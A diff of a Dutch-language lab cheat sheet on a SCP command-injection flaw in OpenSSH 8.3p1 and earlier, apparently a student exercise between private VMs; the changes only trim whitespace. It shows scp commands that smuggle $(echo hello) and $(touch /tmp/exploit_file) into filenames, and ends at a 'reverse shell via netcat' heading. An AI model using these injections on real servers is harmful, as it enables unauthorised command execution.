@@ -1,11 +1,11 @@
-# Cheat sheet aanval Open SSH  
+# Cheat sheet aanval Open SSH
 
 Deze kwetsbaarheid zit in de SCP-client van OpenSSH (versies <= 8.3p1). SCP voert commando's uit op basis van bestandsnamen zonder ze goed te saniteren. Daardoor kan een aanvaller met geldige SSH-credentials kwaadaardige commando’s injecteren via bestandsnamen.
 
 Stap 1: Controleer of de VM's met elkaar kunnen communiceren
 
 ```bash
-ping 192.168.0.163 
+ping 192.168.0.163
 PING 192.168.0.163 (192.168.0.163) 56(84) bytes of data.
 64 bytes from 192.168.0.163: icmp_seq=1 ttl=64 time=16.1 ms
 64 bytes from 192.168.0.163: icmp_seq=2 ttl=64 time=7.04 ms
@@ -19,8 +19,8 @@ SCP command injection
 ```bash
 scp test.txt osboxes@192.168.0.163:/tmp/$(echo hello)
 
-osboxes@192.168.0.163's password: 
-test.txt                                                                                                                                                   100%    0     0.0KB/s   00:00   
+osboxes@192.168.0.163's password:
+test.txt                                                                                                                                                   100%    0     0.0KB/s   00:00
 ```
 
 Resultaat: er verschijnt een bestand hello op de server in /tmp, aangemaakt door de injectie.
@@ -37,7 +37,6 @@ scp test.txt "osboxes@192.168.0.163:'/tmp/$(touch /tmp/exploit_file)'"
 
 ls /tmp/exploit_file
 ```
-
 
 ## Reverse shell via netcat
 
